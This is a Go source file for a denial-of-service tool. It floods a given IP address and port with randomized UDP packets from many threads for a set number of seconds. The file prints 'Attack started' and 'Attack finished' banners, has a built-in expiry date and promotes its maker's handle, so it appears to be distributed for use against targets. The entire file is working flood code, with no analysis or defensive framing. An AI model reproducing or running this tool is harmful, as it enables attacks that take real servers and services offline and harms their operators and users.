package main

import (
	"crypto/rand"
	"fmt"
	mrand "math/rand" // alias math/rand to mrand
	"math/big"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

// Struct to hold attack data
type threadData struct {
	ip   string
	port int
	time int
}

// Usage function to display how to run the program
func usage() {
	fmt.Println("Usage: ./rp <ip> <port> <time> <threads>")
	os.Exit(1)
}

// Function to check if the current date is past the expiry date
func checkExpiryDate() {
	expiryDate := time.Date(2024, 10, 10, 0, 0, 0, 0, time.UTC)
	currentTime := time.Now()
	if currentTime.After(expiryDate) {
		fmt.Printf("The program has expired as of %02d/%02d/%d and can no longer be used.\n",
			expiryDate.Day(), expiryDate.Month(), expiryDate.Year())
		os.Exit(1)
	} else {
		fmt.Printf("Note: Made by @rishp801. This program will expire on %02d/%02d/%d.\n",
			expiryDate.Day(), expiryDate.Month(), expiryDate.Year())
	}
}

// Function to generate a random alphanumeric payload of specified size
func generateRandomPayload(size int) []byte {
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:<>,./?"
	payload := make([]byte, size)

	for i := range payload {
		randomIndex, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			fmt.Printf("Error generating random payload: %v\n", err)
			os.Exit(1)
		}
		payload[i] = charset[randomIndex.Int64()]
	}
	return payload
}

// Generate multiple random payloads outside the attack loop
func generateMultiplePayloads(randSource *mrand.Rand, numberOfPayloads int, minSize, maxSize int) [][]byte {
	payloads := make([][]byte, numberOfPayloads)

	for i := 0; i < numberOfPayloads; i++ {
		size := minSize + randSource.Intn(maxSize-minSize+1)
		payloads[i] = generateRandomPayload(size)
	}
	return payloads
}

// Shuffle payloads for more randomness in attack
func shufflePayloads(payloads [][]byte, randSource *mrand.Rand) [][]byte {
	randSource.Shuffle(len(payloads), func(i, j int) {
		payloads[i], payloads[j] = payloads[j], payloads[i]
	})
	return payloads
}

// Function to perform attack with controlled concurrency and pre-generated random payloads
func attack(data threadData, wg *sync.WaitGroup, conn *net.UDPConn, randSource *mrand.Rand) {
	defer wg.Done()

	// Generate and shuffle payloads
	payloads := generateMultiplePayloads(randSource, 50, 800, 1200) // Adjust payload size for more variability
	shuffledPayloads := shufflePayloads(payloads, randSource)

	endTime := time.Now().Add(time.Duration(data.time) * time.Second)

	// UDP attack loop
	for time.Now().Before(endTime) {
		for _, payload := range shuffledPayloads {
			_, err := conn.Write(payload)
			if err != nil {
				fmt.Println("Send failed:", err)
				return
			}
		}
	}
}

func countdown(seconds int) {
	for seconds > 0 {
		fmt.Printf("\rTime remaining: %d seconds", seconds)
		time.Sleep(1 * time.Second)
		seconds--
	}
	fmt.Println()
}

func main() {
	if len(os.Args) != 5 {
		usage()
	}
	checkExpiryDate()

	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil || port <= 0 || port > 65535 {
		fmt.Println("Invalid port number")
		os.Exit(1)
	}
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil || duration <= 0 {
		fmt.Println("Invalid duration value")
		os.Exit(1)
	}
	threads, err := strconv.Atoi(os.Args[4])
	if err != nil || threads <= 0 {
		fmt.Println("Invalid number of threads")
		os.Exit(1)
	}

	if net.ParseIP(ip) == nil {
		fmt.Println("Invalid IP address format")
		os.Exit(1)
	}

	fmt.Printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads)
	serverAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Println("Failed to resolve UDP address:", err)
		os.Exit(1)
	}

	var wg sync.WaitGroup
	randSource := mrand.New(mrand.NewSource(time.Now().UnixNano()))

	for i := 0; i < threads; i++ {
		conn, err := net.DialUDP("udp", nil, serverAddr)
		if err != nil {
			fmt.Println("Failed to create UDP connection:", err)
			continue
		}
		defer conn.Close() // Close connection after attack
		wg.Add(1)
		go attack(threadData{ip, port, duration}, &wg, conn, randSource)
	}

	countdown(duration)
	wg.Wait()
	fmt.Println("Attack finished. Join @rishp801")
}